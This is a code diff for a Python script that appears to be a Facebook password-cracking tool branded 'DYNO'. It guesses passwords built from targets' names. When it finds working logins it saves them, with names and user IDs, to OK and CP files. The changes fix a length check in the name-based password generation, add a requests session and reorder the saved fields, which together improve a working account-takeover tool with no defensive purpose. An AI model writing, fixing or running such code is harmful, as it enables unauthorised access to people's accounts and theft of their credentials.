@@ -1,5 +1,5 @@
 
-#-
+#1,.1111
 
 def clear():
 	os.system("clear")
@@ -214,9 +214,9 @@ def all_pass():
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
 			lsn = nmf.split(' ')[1]
-			if frs > 3:
+			if len(frs) > 3:
 				nm=frs
-			elif lsn > 3:
+			elif len(lsn) > 3:
 				nm=lsn
 			else:
 				nm=frs+lsn
@@ -337,7 +337,7 @@ def api_1(arg , p , name):
 		pass
 	print(f"\r{G}[𝐃𝐘𝐍𝐎] {c1()}{str(loop)}/{str(len(ids))} {G}OK/{str(ok)} {RR}{Y}CP/{str(cp)}",end="");sys.stdout.flush()
 		#100074579974053
-	
+	ses = requests.Session()
 	for pws in pas:
 		if len(user) < 6:
 			break				
@@ -365,11 +365,13 @@ def api_1(arg , p , name):
 		
 		if "session_key" in response.text and "EAAA" in response.text:
 			a = f'''
+==========DUSKY-OK==========\n
 Name     : {name}
-ID       : {user}
 PassWord : {pws}
+ID       : {user}
 
-==========DUSKY-OK==========\n'''
+
+'''
 			print("\n")
 			print(f"{G}══════════[𝐃𝐘𝐍𝐎➱OK]══════════\nName : {name}\nPassWord : {pws}\nID : {user}\n══════════[𝐃𝐘𝐍𝐎➱OK]══════════{RR}")
 			open("OK_DYNO.txt" , "a").write(a)
@@ -378,10 +380,10 @@ PassWord : {pws}
 			break
 		elif "www.facebook.com" in response.json()["error_msg"]:
 			a = f'''
+==========DUSKY-CP==========\n
 Name     : {name}
-ID       : {user}
 PassWord : {pws}
-==========DUSKY-CP==========\n'''
+ID       : {user}'''
 			print(f"{Y}══════════[𝐃𝐘𝐍𝐎➱CP]══════════\nName : {name}\nPassWord : {pws}\nID : {user}\n══════════[𝐃𝐘𝐍𝐎➱CP]══════════{RR}")
 			open("CP_DYNO.txt" , "a").write(a)
 			cp += 1
